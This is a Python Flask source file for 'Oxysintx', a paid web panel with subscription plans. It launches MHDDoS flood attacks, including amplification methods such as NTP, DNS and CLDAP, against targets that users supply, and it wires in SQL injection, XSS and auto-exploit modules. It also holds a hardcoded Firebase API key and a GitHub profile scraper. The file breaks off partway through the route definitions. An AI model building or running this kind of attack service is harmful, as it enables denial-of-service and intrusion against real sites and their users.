#!/usr/bin/env python3
"""
Oxysintx - Main Flask Application (v3.6.0)

Routing and API. MHDDoS engine (start.py) integrated as external subprocess.
Attack launches directly on user request.

v3.6.0 — Full integration with:
    • http_logger          (global request capture + SSE + HAR + anomaly scan)
    • dirfuzz              (directory / file fuzzer, SSE streaming)
    • sqli_engine          (professional SQLi engine — 4 techniques)
    • sql_map              (multi-technique SQLi scanner w/ confidence scoring)
    • sql_injection        (lightweight SQLi detector)
    • xss_exploiter        (professional reflected XSS exploiter, SSE)
    • xss                  (lightweight XSS scanner)
    • sniper               (auto-exploiter orchestrator, SSE)

Author: Yanxzyx
"""

import base64
import binascii
import hashlib
import json
import logging
import os
import re
import secrets
import signal
import string
import sys
import threading
import time
import uuid
from collections import OrderedDict, defaultdict
from datetime import datetime, timedelta, timezone
from functools import wraps
from importlib import import_module
from pathlib import Path
from subprocess import Popen, PIPE

import psutil
import requests
from bs4 import BeautifulSoup
from flask import (
    Flask, render_template, request, jsonify, session, redirect,
    send_from_directory, Response, g, stream_with_context
)
from werkzeug.security import generate_password_hash, check_password_hash

from config import Config
from auth.user_store import (
    UserStore, ensure_default_user, verify_credentials, create_user, get_role,
    list_users, delete_user, DEFAULT_USERNAME, VALID_ROLES,
)
from auth.token_store import token_store
from core.logger_setup import setup_logging
from core.history_store import HistoryStore
from core.system_monitor import get_system_stats
from modules.scan_orchestrator import ScanOrchestrator, TOOL_MAP
from modules.source_viewer import run as fetch_source
from modules.search_user import run as search_user_run
from modules.telegram import (
    connect_bot, disconnect_bot, get_bot_status,
    update_bot_settings, broadcast_message, auto_restart_bot,
    set_orchestrator, set_history_store,
)
from modules.whatsapp import whatsapp_bp

# ── Optional: new exploit / recon modules ──────────────────────────────
try:
    from modules.dirfuzz import (
        run as dirfuzz_run,
        run_streaming as dirfuzz_stream,
        list_wordlists as dirfuzz_list_wordlists,
        ensure_wordlist_dir as dirfuzz_ensure_dir,
    )
    _dirfuzz_available = True
except ImportError:
    _dirfuzz_available = False

try:
    from modules.sqli_engine import (
        run as sqli_run,
        run_streaming as sqli_stream,
        ensure_wordlists as sqli_ensure_wordlists,
        WORDLIST_SOURCES as SQLI_WORDLIST_SOURCES,
    )
    _sqli_engine_available = True
except ImportError:
    _sqli_engine_available = False

try:
    from modules import sql_map as sql_map_module
    _sql_map_available = True
except ImportError:
    _sql_map_available = False

try:
    from modules import sql_injection as sql_injection_module
    _sql_injection_available = True
except ImportError:
    _sql_injection_available = False

try:
    from modules.xss_exploiter import (
        run as xss_exploiter_run,
        run_streaming as xss_exploiter_stream,
        ensure_wordlist as xss_ensure_wordlist,
    )
    _xss_exploiter_available = True
except ImportError:
    _xss_exploiter_available = False

try:
    from modules import xss as xss_module
    _xss_available = True
except ImportError:
    _xss_available = False

try:
    from modules.sniper import (
        run as sniper_run,
        run_streaming as sniper_stream,
    )
    _sniper_available = True
except ImportError:
    _sniper_available = False

try:
    from modules.http_logger import HttpLogger
    _http_logger_available = True
except ImportError:
    _http_logger_available = False

try:
    from modules.downsea import downsea_bp
    _downsea_available = True
except ImportError:
    _downsea_available = False

from ai_chat.chat_handler import ChatHandler

try:
    from modules import testing as code_test_module
    _testing_available = True
except ImportError:
    _testing_available = False

try:
    from modules.analytic_manager import AnalyticDataManager
    _analytic_available = True
except ImportError:
    _analytic_available = False

_quick_menu_bp = None
_quick_menu_available = False
try:
    from modules import quick_menu
    if hasattr(quick_menu, 'quick_menu_bp'):
        _quick_menu_bp = quick_menu.quick_menu_bp
        _quick_menu_available = True
    elif hasattr(quick_menu, 'bp'):
        _quick_menu_bp = quick_menu.bp
        _quick_menu_available = True
except ImportError:
    pass

# ═══════════════════════════════════════════════════════════════════════════
# STARTUP BANNER (single, clean)
# ═══════════════════════════════════════════════════════════════════════════
BANNER = r"""
    ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄▀▀▀▀▀▄   ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄   ▄▀▀▀▀▀▀▀▀▀█  ▄▀▀▀▀▀▀▀▀▀█ █▀▀▀▀▀▀▀▀▀▄  █▀▀▀▀▀▀▀▀▀▀▓
    █·   ▄▄▄▄▄▄█ ▀    ▄▄     ▄    █ █·   ▄▄▄▄▄▄█ ▀    ▄▄  ∙ █ █·   ▄▄▄▄▄▄█ █·   ▄▄▄▄▄▄█ ▀    ▄▄    █ ▀    ▄▄▄ ∙ ▒
    ▓  . ▓▄▄▄▄▄▄ ▓    ▓ ▌   ▓ ▌   ▓ ▓  . ▓▄▄▄▄▄▄ ▓    ▓▄▌   ▓ ▓  . ▓ ▄▄▄▄▄ ▓  . ▓▄▄▄▄▄▄ ▓    ▓ ▌   ▓ ▓    ▓ ▀▀▀▀▀
    ▒ ∙  ▄▄▄▄▄▄▒ ▒    ▒ ▒ · ▒ ▒ · ▒ ▒ ∙  ▄▄▄▄▄▄▒ ▒   ·▄▄▄  ▀▄ ▒ ∙  ▒ ▄   ▒ ▒ ∙  ▄▄▄▄▄▄▒ ▒    ▒ ▒ · ▒ ░▄▄▄ ▀▀▀▀▀▀▒
    ░    ░▄▄▄▄▄▄ ░   ∙░ ░   ░ ░   ░ ░    ░▄▄▄▄▄▄ ░ .  ░ ░  .░ ░    ░▄░   ░ ░    ░▄▄▄▄▄▄ ░   ∙░ ░   ░ ▄▄▄▄▄  ▒  .░
    █    .    ·█ █ ∙  █ █   █ █   █ █    .    ·█ █    █ █∙  █ █    .    ·█ █    .    ·█ █ ∙  █ █   █ ▓   ▀▀▀▀∙  █
    █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄█ ░▄▄▄▄▄▄▄▄▄▄█
"""

# ═══════════════════════════════════════════════════════════════════════════
# MHDDoS engine (start.py integration)
# ═══════════════════════════════════════════════════════════════════════════
MHDDOS_SCRIPT = Path(__file__).parent / "start.py"
_mhddos_processes = {}
_mhddos_lock = threading.Lock()
_mhddos_history = []
_MHDDOS_HISTORY_LIMIT = 500

_MHDDOS_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
    "TOR", "RHEX", "STOMP",
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
}

_MHDDOS_LAYER7 = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER",
    "TOR", "RHEX", "STOMP",
}

_MHDDOS_LAYER4 = {
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP",
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP",
}

_MHDDOS_AMP = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}


def _mhddos_build_command(method, target, threads, duration,
                          proxy_type=0, proxy_file="proxies.txt",
                          rpc=1, debug=False, reflector_file=""):
    cmd = [sys.executable, str(MHDDOS_SCRIPT)]
    if method in _MHDDOS_LAYER7:
        url = target if target.startswith(("http://", "https://")) else f"http://{target}"
        cmd.extend([method, url, str(proxy_type), str(threads),
                    proxy_file, str(rpc), str(duration)])
    else:
        ip_port = target
        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", ip_port):
            try:
                from socket import gethostbyname
                hostname, port = ip_port.rsplit(":", 1)
                ip_port = f"{gethostbyname(hostname)}:{port}"
            except Exception:
                pass
        cmd.extend([method, ip_port, str(threads), str(duration)])
        if method in _MHDDOS_AMP:
            cmd.append(reflector_file if reflector_file else "reflectors.txt")
    if debug:
        cmd.append("debug")
    return cmd


def _mhddos_start_attack(attack_id, method, target, threads, duration,
                         proxy_type, proxy_file, rpc, reflector_file, debug):
    cmd = _mhddos_build_command(method, target, threads, duration,
                                proxy_type, proxy_file, rpc, debug, reflector_file)
    try:
        process = Popen(
            cmd, stdout=PIPE, stderr=PIPE, text=True,
            creationflags=0, cwd=str(Path(__file__).parent),
        )
        with _mhddos_lock:
            _mhddos_processes[attack_id] = {
                "process": process,
                "method": method,
                "target": target,
                "threads": threads,
                "duration": duration,
                "started_at": datetime.now(timezone.utc).isoformat(),
                "status": "running",
                "attack_id": attack_id,
            }
            _mhddos_history.append({
                "attack_id": attack_id,
                "method": method,
                "target": target,
                "threads": threads,
                "duration": duration,
                "started_at": datetime.now(timezone.utc).isoformat(),
                "status": "running",
            })
            if len(_mhddos_history) > _MHDDOS_HISTORY_LIMIT:
                del _mhddos_history[:-_MHDDOS_HISTORY_LIMIT]
        threading.Thread(target=_mhddos_monitor, args=(attack_id,), daemon=True).start()
        return {"success": True, "attack_id": attack_id}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _mhddos_monitor(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info:
            return
        process = info["process"]
    try:
        timeout = info["duration"] + 15
        process.wait(timeout=timeout)
        status = "completed" if process.returncode == 0 else "failed"
    except Exception:
        status = "timeout"
        try:
            process.kill()
        except Exception:
            pass
    with _mhddos_lock:
        if attack_id in _mhddos_processes:
            _mhddos_processes[attack_id]["status"] = status
            _mhddos_processes[attack_id]["ended_at"] = datetime.now(timezone.utc).isoformat()
        for entry in _mhddos_history:
            if entry["attack_id"] == attack_id:
                entry["status"] = status
                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
                break


def _mhddos_stop_attack(attack_id):
    with _mhddos_lock:
        info = _mhddos_processes.get(attack_id)
        if not info:
            return {"success": False, "error": "Attack not found"}
        try:
            if os.name == "nt":
                info["process"].kill()
            else:
                info["process"].send_signal(signal.SIGTERM)
            info["status"] = "stopped"
            info["ended_at"] = datetime.now(timezone.utc).isoformat()
        except Exception as e:
            return {"success": False, "error": str(e)}
        for entry in _mhddos_history:
            if entry["attack_id"] == attack_id:
                entry["status"] = "stopped"
                entry["ended_at"] = datetime.now(timezone.utc).isoformat()
                break
    return {"success": True}


def _mhddos_stop_all():
    stopped = 0
    with _mhddos_lock:
        for info in _mhddos_processes.values():
            if info["status"] == "running":
                try:
                    info["process"].kill()
                    info["status"] = "stopped"
                    info["ended_at"] = datetime.now(timezone.utc).isoformat()
                    stopped += 1
                except Exception:
                    pass
    return {"success": True, "stopped": stopped}


def _mhddos_get_status(attack_id=None):
    with _mhddos_lock:
        if attack_id:
            return _mhddos_processes.get(attack_id, None)
        running = [v for v in _mhddos_processes.values() if v["status"] == "running"]
        return {
            "running": running,
            "history": list(_mhddos_history[-50:]),
            "available": True,
            "methods": sorted(_MHDDOS_METHODS),
            "layer7": sorted(_MHDDOS_LAYER7),
            "layer4": sorted(_MHDDOS_LAYER4),
        }


# ═══════════════════════════════════════════════════════════════════════════
# GitHub Profile Scraper (LRU-bounded)
# ═══════════════════════════════════════════════════════════════════════════
GITHUB_URL = "https://github.com"
GITHUB_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/120.0.0.0 Safari/537.36"
)
GITHUB_TIMEOUT = 15
GITHUB_CACHE_TTL = 60
_GITHUB_CACHE_MAX = 500
_github_cache = OrderedDict()


def github_fetch_html(url):
    if url in _github_cache:
        ts, html = _github_cache[url]
        if time.time() - ts < GITHUB_CACHE_TTL:
            _github_cache.move_to_end(url)
            return html, None
        del _github_cache[url]

    headers = {"User-Agent": GITHUB_USER_AGENT, "Accept-Language": "en-US,en;q=0.9"}
    try:
        resp = requests.get(url, headers=headers, timeout=GITHUB_TIMEOUT)
    except requests.exceptions.RequestException as e:
        return None, f"Network error: {e}"

    if resp.status_code == 200:
        html = resp.text
        _github_cache[url] = (time.time(), html)
        if len(_github_cache) > _GITHUB_CACHE_MAX:
            _github_cache.popitem(last=False)
        return html, None
    elif resp.status_code == 404:
        return None, "GitHub user not found."
    elif resp.status_code == 403:
        return None, "GitHub is rate-limiting requests. Try again later."
    elif resp.status_code == 503:
        return None, "GitHub is temporarily unavailable."
    return None, f"GitHub returned status {resp.status_code}."


def github_extract_embedded_json(html):
    if not html:
        return {}
    for pattern in (
        r'<script type="application/json" data-target="react-app\.embeddedData">(.*?)</script>',
        r'<script type="application/json" data-target="react-app\.embeddedData"[^>]*>(.*?)</script>',
    ):
        match = re.search(pattern, html, re.DOTALL)
        if match:
            try:
                return json.loads(match.group(1))
            except json.JSONDecodeError:
                continue
    return {}


def github_parse_profile_from_embedded(embedded):
    payload = embedded.get("payload", {})
    user = payload.get("user", {}) or payload.get("profile", {})
    if not user:
        return {}

    def get_count(data, key, default=0):
        val = data.get(key, default)
        if isinstance(val, dict):
            return val.get("totalCount", default)
        return val if val is not None else default

    return {
        "login": user.get("login", ""),
        "name": user.get("name", ""),
        "bio": user.get("bio", ""),
        "avatar_url": user.get("avatarUrl", ""),
        "followers": get_count(user, "followers"),
        "following": get_count(user, "following"),
        "company": user.get("company", ""),
        "location": user.get("location", ""),
        "blog": user.get("websiteUrl", "") or user.get("blog", ""),
        "twitter_username": user.get("twitterUsername", ""),
        "created_at": user.get("createdAt", ""),
        "public_repos": get_count(user, "repositories"),
    }


def github_parse_repos_from_embedded(embedded):
    payload = embedded.get("payload", {})
    repos_data = payload.get("repositories", {})
    nodes = repos_data.get("nodes", []) if isinstance(repos_data, dict) else (repos_data if isinstance(repos_data, list) else [])
    repos = []
    for repo in nodes:
        if not isinstance(repo, dict):
            continue
        repo_url = repo.get("url", "")
        if repo_url and repo_url.startswith("/"):
            repo_url = GITHUB_URL + repo_url
        primary = repo.get("primaryLanguage", {})
        language = primary.get("name", "") if isinstance(primary, dict) else repo.get("language", "")
        stars = repo.get("stargazerCount", 0)
        if isinstance(stars, dict):
            stars = stars.get("totalCount", 0)
        license_info = repo.get("licenseInfo", {})
        license_name = license_info.get("spdxId", "") if isinstance(license_info, dict) else ""
        repos.append({
            "name": repo.get("name", ""),
            "html_url": repo_url,
            "description": repo.get("description") or "",
            "language": language,
            "stargazers_count": stars,
            "forks_count": repo.get("forkCount", 0),
            "updated_at": repo.get("updatedAt", ""),
            "license": license_name,
        })
    repos.sort(key=lambda r: r["stargazers_count"], reverse=True)
    return repos


def github_scrape_profile(username):
    url = f"{GITHUB_URL}/{username}"
    html, error = github_fetch_html(url)
    if error:
        return None, error
    embedded = github_extract_embedded_json(html)
    if embedded:
        profile = github_parse_profile_from_embedded(embedded)
        if profile:
            return profile, None
    soup = BeautifulSoup(html, "html.parser")
    username_el = soup.find("span", {"class": "p-nickname"})
    scraped_username = username_el.get_text(strip=True) if username_el else username
    name_el = soup.find("span", {"class": "p-name"})
    name = name_el.get_text(strip=True) if name_el else ""
    bio_el = soup.find("div", {"class": "p-note"})
    bio = bio_el.get_text(strip=True) if bio_el else ""
    avatar_el = soup.find("img", {"class": "avatar-user"})
    avatar_url = avatar_el.get("src") if avatar_el else ""
    if avatar_url and avatar_url.startswith("//"):
        avatar_url = "https:" + avatar_url
    followers = following = 0
    for link in soup.find_all("a", href=True):
        href = link["href"]
        if href == f"/{username}?tab=followers":
            num_el = link.find("span")
            if num_el:
                followers = int(re.sub(r"[^\d]", "", num_el.get_text()) or 0)
        elif href == f"/{username}?tab=following":
            num_el = link.find("span")
            if num_el:
                following = int(re.sub(r"[^\d]", "", num_el.get_text()) or 0)
    company = location = blog = twitter = ""
    for li in soup.find_all("li", {"itemprop": True}):
        prop = li.get("itemprop")
        text = " ".join(li.get_text(strip=True).split())
        if prop == "worksFor":
            company = text
        elif prop == "homeLocation":
            location = text
        elif prop == "url":
            a = li.find("a")
            if a and "twitter" in a.get("href", ""):
                twitter = a.get("href").split("/")[-1]
            else:
                blog = text
    return {
        "login": scraped_username, "name": name, "bio": bio,
        "avatar_url": avatar_url, "followers": followers, "following": following,
        "company": company, "location": location, "blog": blog,
        "twitter_username": twitter, "created_at": "", "public_repos": 0,
    }, None


def github_scrape_repositories(username):
    url = f"{GITHUB_URL}/{username}?tab=repositories"
    html, error = github_fetch_html(url)
    if error:
        return None, error
    embedded = github_extract_embedded_json(html)
    if embedded:
        repos = github_parse_repos_from_embedded(embedded)
        if repos:
            return repos, None
    soup = BeautifulSoup(html, "html.parser")
    repos = []
    for li in soup.find_all("li", class_="col-12"):
        h3 = li.find("h3")
        if not h3 or not h3.find("a"):
            continue
        name_el = h3.find("a")
        repo_name = name_el.get_text(strip=True)
        repo_url = name_el.get("href", "")
        if repo_url.startswith("/"):
            repo_url = GITHUB_URL + repo_url
        desc_el = li.find("p", itemprop="description")
        description = desc_el.get_text(strip=True) if desc_el else ""
        lang_el = li.find("span", itemprop="programmingLanguage")
        language = lang_el.get_text(strip=True) if lang_el else ""
        stars_el = li.find("a", href=re.compile(r"/stargazers$"))
        stars = int(re.sub(r"[^\d]", "", stars_el.get_text()) or 0) if stars_el else 0
        forks_el = li.find("a", href=re.compile(r"/forks$"))
        forks = int(re.sub(r"[^\d]", "", forks_el.get_text()) or 0) if forks_el else 0
        updated_el = li.find("relative-time")
        updated = updated_el.get("datetime", "") if updated_el else ""
        repos.append({
            "name": repo_name, "html_url": repo_url, "description": description,
            "language": language, "stargazers_count": stars, "forks_count": forks,
            "updated_at": updated, "license": "",
        })
    repos.sort(key=lambda r: r["stargazers_count"], reverse=True)
    return repos, None


# ═══════════════════════════════════════════════════════════════════════════
# Firebase configuration (env-overridable)
# ═══════════════════════════════════════════════════════════════════════════
firebaseConfig = {
    "apiKey": os.getenv("FIREBASE_API_KEY", "AIzaSyBmcSWhaqkk5u13MCnw3kB6M9wP4SySZCw"),
    "authDomain": os.getenv("FIREBASE_AUTH_DOMAIN", "emergens-auth.firebaseapp.com"),
    "databaseURL": os.getenv("FIREBASE_DB_URL", "https://emergens-auth-default-rtdb.firebaseio.com"),
    "projectId": os.getenv("FIREBASE_PROJECT_ID", "emergens-auth"),
    "storageBucket": os.getenv("FIREBASE_STORAGE_BUCKET", "emergens-auth.firebasestorage.app"),
    "messagingSenderId": os.getenv("FIREBASE_SENDER_ID", "1085657141149"),
    "appId": os.getenv("FIREBASE_APP_ID", "1:1085657141149:web:16e7a8b888cb31a59e2974"),
}

# ═══════════════════════════════════════════════════════════════════════════
# Flask app
# ═══════════════════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = Config.SECRET_KEY
app.permanent_session_lifetime = timedelta(hours=8)
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=os.getenv("SESSION_COOKIE_SECURE", "0") == "1",
)

app.register_blueprint(whatsapp_bp)
if _downsea_available:
    app.register_blueprint(downsea_bp)
if _quick_menu_available and _quick_menu_bp is not None:
    app.register_blueprint(_quick_menu_bp)

setup_logging(Config.SERVER_LOG_FILE)
logger = logging.getLogger("oxysintx")

# ═══════════════════════════════════════════════════════════════════════════
# Backing services
# ═══════════════════════════════════════════════════════════════════════════
history_store = HistoryStore()
chat_handler = ChatHandler(api_key=Config.ANTHROPIC_API_KEY)
user_store = UserStore()
scan_orchestrator = ScanOrchestrator()

set_orchestrator(scan_orchestrator)
set_history_store(history_store)

# ═══════════════════════════════════════════════════════════════════════════
# Directories
# ═══════════════════════════════════════════════════════════════════════════
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
for d in ["userdata", "listschool", os.path.join("static", "data"),
          "files", os.path.join("files", "proxies")]:
    os.makedirs(os.path.join(PROJECT_ROOT, d), exist_ok=True)

DATA_DIR = os.path.join(PROJECT_ROOT, 'data')
LOG_DIR = os.path.join(PROJECT_ROOT, 'logs')
UPLOAD_DIR = os.path.join(DATA_DIR, 'uploads')
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════════════
# Thread-safe JSON I/O
# ═══════════════════════════════════════════════════════════════════════════
_json_locks = defaultdict(threading.Lock)


def _load_json(name, default):
    path = os.path.join(DATA_DIR, f'{name}.json')
    with _json_locks[name]:
        if not os.path.exists(path):
            return default
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError):
            return default


def _save_json(name, data):
    path = os.path.join(DATA_DIR, f'{name}.json')
    tmp = path + '.tmp'
    with _json_locks[name]:
        with open(tmp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.flush()
            try:
                os.fsync(f.fileno())
            except OSError:
                pass
        os.replace(tmp, path)


def _json_lock(name):
    return _json_locks[name]


def _now_iso():
    return datetime.now(timezone.utc).isoformat()


def _client_ip():
    fwd = request.headers.get('X-Forwarded-For', '')
    if fwd:
        return fwd.split(',')[0].strip()
    real = request.headers.get('X-Real-IP', '').strip()
    if real:
        return real
    return request.remote_addr or 'unknown'


# ═══════════════════════════════════════════════════════════════════════════
# Request counters (for Network Traffic panel)
# ═══════════════════════════════════════════════════════════════════════════
_request_log_lock = threading.Lock()
_request_timestamps = []
_total_requests_seen = 0


@app.before_request
def _count_inbound_request():
    global _total_requests_seen
    with _request_log_lock:
        now = time.time()
        _total_requests_seen += 1
        _request_timestamps.append(now)
        cutoff = now - 60
        while _request_timestamps and _request_timestamps[0] < cutoff:
            _request_timestamps.pop(0)


def _inbound_stats():
    with _request_log_lock:
        return _total_requests_seen, len(_request_timestamps)


# ═══════════════════════════════════════════════════════════════════════════
# HTTP Logger (global request capture)
# ═══════════════════════════════════════════════════════════════════════════
http_logger = None
if _http_logger_available:
    try:
        persist_dir = Path(DATA_DIR) / "http_logs"
        http_logger = HttpLogger(
            max_entries=int(os.getenv("HTTP_LOG_BUFFER", "5000")),
            max_body_bytes=int(os.getenv("HTTP_LOG_BODY_MAX", "8192")),
            persist_dir=persist_dir,
        )
        http_logger.attach(app)
    except Exception as e:
        logger.error(f"Failed to attach HttpLogger: {e}")
        http_logger = None


# ═══════════════════════════════════════════════════════════════════════════
# API-key helper (single source of truth: user_store)
# ═══════════════════════════════════════════════════════════════════════════
def _hash_api_key(raw_key):
    return hashlib.sha256(raw_key.encode('utf-8')).hexdigest()


def _public_key_view(k):
    return {
        'prefix': k.get('prefix') or k.get('key_prefix'),
        'created': k.get('created_at') or k.get('created'),
        'last_used': k.get('last_used'),
        'request_count': k.get('request_count', 0),
    }


def _record_server_activity(key_prefix, username, req):
    reported_name = (
        req.headers.get('X-Server-Name')
        or (req.get_json(silent=True) or {}).get('server_name')
        or None
    )
    ip = req.headers.get('X-Forwarded-For', req.remote_addr) or 'unknown'
    with _json_lock('servers'):
        servers = _load_json('servers', [])
        entry = next((s for s in servers if s['key_prefix'] == key_prefix), None)
        if entry:
            entry['last_seen'] = _now_iso()
            entry['requests'] = entry.get('requests', 0) + 1
            entry['ip'] = ip
            if reported_name:
                entry['server_name'] = reported_name
        else:
            servers.append({
                'server_name': reported_name or f'Unnamed ({key_prefix})',
                'key_prefix': key_prefix,
                'ip': ip,
                'last_seen': _now_iso(),
                'requests': 1,
            })
        _save_json('servers', servers)


def _find_api_key_owner(raw_key):
    try:
        keys = user_store.get_api_keys()
    except Exception:
        keys = []
    key_hash = _hash_api_key(raw_key)
    for k in keys:
        stored_hash = k.get('key_hash') or k.get('hash')
        if stored_hash and stored_hash == key_hash:
            return k
        if k.get('key') == raw_key:
            return k
    return None


def _api_key_required(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        raw_key = request.headers.get('X-API-Key', '').strip()
        if not raw_key:
            return jsonify({'error': 'Missing X-API-Key header'}), 401

        record = _find_api_key_owner(raw_key)
        if not record:
            return jsonify({'error': 'Invalid API key'}), 401

        prefix = record.get('prefix') or record.get('key_prefix') or raw_key[:20]
        owner = record.get('owner_username') or record.get('username') or 'unknown'

        try:
            user_store.touch_api_key(prefix)
        except Exception:
            pass

        _record_server_activity(prefix, owner, request)
        g.api_key_owner = owner
        return fn(*args, **kwargs)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# Payment data
# ═══════════════════════════════════════════════════════════════════════════
PAYMENT_DATA_FILE = os.path.join(PROJECT_ROOT, "payment_data.json")
PAYMENT_PLANS_FILE = os.path.join(PROJECT_ROOT, "payment_plans.json")

_default_plans = {
    "free": {"name": "Free Plan", "price": "0.00"},
    "starter": {"name": "Starter Plan", "price": "9.00"},
    "standard": {"name": "Standard Plan", "price": "25.00"},
    "team": {"name": "Team Plan", "price": "49.00"},
    "enterprise": {"name": "Enterprise Plan", "price": "99.00"},
}

_payment_lock = threading.Lock()


def _load_plans():
    if os.path.exists(PAYMENT_PLANS_FILE):
        try:
            with open(PAYMENT_PLANS_FILE, "r") as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            logger.warning("Failed to load payment plans, using defaults.")
    return _default_plans.copy()


def _save_plans(plans):
    try:
        with _payment_lock:
            with open(PAYMENT_PLANS_FILE, "w") as f:
                json.dump(plans, f, indent=2)
        return True
    except IOError:
        logger.error("Failed to save payment plans.")
        return False


def _load_payments():
    if os.path.exists(PAYMENT_DATA_FILE):
        try:
            with open(PAYMENT_DATA_FILE, "r") as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            logger.warning("Failed to load payment data, starting empty.")
    return []


def _save_payments(payments):
    try:
        with _payment_lock:
            with open(PAYMENT_DATA_FILE, "w") as f:
                json.dump(payments, f, indent=2)
        return True
    except IOError:
        logger.error("Failed to save payment data.")
        return False


payment_plans = _load_plans()

# ═══════════════════════════════════════════════════════════════════════════
# Login rate limiting
# ═══════════════════════════════════════════════════════════════════════════
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_SECONDS = 300
_failed_attempts = defaultdict(list)
_failed_lock = threading.Lock()


def _is_locked_out(ip):
    now = time.time()
    with _failed_lock:
        _failed_attempts[ip] = [t for t in _failed_attempts[ip] if now - t < LOCKOUT_SECONDS]
        return len(_failed_attempts[ip]) >= MAX_LOGIN_ATTEMPTS


def _record_failed_attempt(ip):
    with _failed_lock:
        _failed_attempts[ip].append(time.time())


# ═══════════════════════════════════════════════════════════════════════════
# Auth decorators
# ═══════════════════════════════════════════════════════════════════════════
def _extract_bearer_token():
    auth = request.headers.get("Authorization", "")
    if auth.startswith("Bearer "):
        return auth[7:]
    return ""


def _authenticate_request():
    username = session.get("username")
    if username:
        role = get_role(username)
        if role is None:
            session.clear()
        else:
            session["role"] = role
            return True

    token = _extract_bearer_token()
    if token:
        username = token_store.validate_token(token)
        if username:
            role = get_role(username)
            if role is None:
                return False
            session["authenticated"] = True
            session["username"] = username
            session["role"] = role
            session.permanent = True
            return True
    return False


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not _authenticate_request():
            if request.path.startswith("/api/"):
                return jsonify({"error": "unauthorized"}), 401
            return redirect(f"/login.html?next={request.path}")
        return f(*args, **kwargs)
    return wrapper


def api_login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not _authenticate_request():
            return jsonify({"error": "unauthorized"}), 401
        return f(*args, **kwargs)
    return wrapper


def role_required(*allowed_roles):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            if not _authenticate_request():
                return jsonify({"error": "unauthorized"}), 401
            if session.get("role") not in allowed_roles:
                return jsonify({"error": "forbidden"}), 403
            return f(*args, **kwargs)
        return wrapper
    return decorator


def current_user():
    username = session.get("username")
    if not username:
        return None
    role = get_role(username)
    if role is None:
        return None
    return {'username': username, 'role': role}


def owner_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        u = current_user()
        if not u:
            return jsonify({'error': 'Not authenticated'}), 401
        if u.get('role') != 'owner':
            return jsonify({'error': 'Owner access required'}), 403
        return f(*args, **kwargs)
    return wrapper


# ═══════════════════════════════════════════════════════════════════════════
# SSE helpers
# ═══════════════════════════════════════════════════════════════════════════
def _sse_format(event: dict) -> str:
    """Format a dict as an SSE data frame."""
    try:
        payload = json.dumps(event, ensure_ascii=False, default=str)
    except Exception:
        payload = json.dumps({"type": "error", "message": "serialization failed"})
    return f"data: {payload}\n\n"


def _sse_response(generator, headers: dict = None):
    base_headers = {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache, no-transform",
        "X-Accel-Buffering": "no",
        "Connection": "keep-alive",
    }
    if headers:
        base_headers.update(headers)
    return Response(stream_with_context(generator), headers=base_headers)


# ═══════════════════════════════════════════════════════════════════════════
# Page routes
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/")
def index():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("get-started.html")


@app.route("/get-started.html")
def get_started_page():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("get-started.html")


@app.route("/login.html")
def login_page():
    if _authenticate_request():
        return redirect("/dashboard.html")
    return render_template("login.html")


@app.route("/dashboard.html")
@login_required
def dashboard_page():
    return render_template(
        "dashboard.html",
        username=session.get("username", DEFAULT_USERNAME),
        role=session.get("role", "owner"),
    )


@app.route("/payment.html")
